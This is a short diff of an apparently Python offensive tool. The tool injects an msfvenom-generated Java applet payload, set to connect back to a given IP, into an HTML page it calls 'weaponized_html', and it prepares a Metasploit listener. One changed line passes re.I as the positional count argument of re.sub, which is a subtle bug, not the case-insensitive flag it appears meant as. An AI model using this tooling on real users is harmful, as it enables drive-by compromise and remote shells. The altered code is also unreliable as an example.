@@ -33,7 +33,7 @@ Options:
   -w            Specifies the Windows payload to use. [default: {windows}]
   -l            Specifies the Linux payload to use. [default: {linux}]
   -m            Specifies the Mac OS X payload to use. [default: {osx}]
-  <payload>     The payload string as expected by msfvenom.
+  <payload>     The payload string as expected by msfvenom. Run `msfvenom -l payloads` to see all choices.
   <html_file>   The HTML file to insert the Java payload.
   <ip>          The IP address the payload should connect back to.
 
@@ -93,7 +93,7 @@ if __name__ == '__main__':
     with open(os.path.join('output', 'index.html'), 'w') as html_outfile:
       html = html_infile.read()
       applet_code = re.sub('ipaddrhere', ip_address, APPLET_TEMPLATE)
-      weaponized_html = re.sub('</body>', applet_code + '\n</body>', html)
+      weaponized_html = re.sub('</body>', applet_code + '\n</body>', html, re.I)
       html_outfile.write(weaponized_html)
 
   print 'Creating listener resource script...'
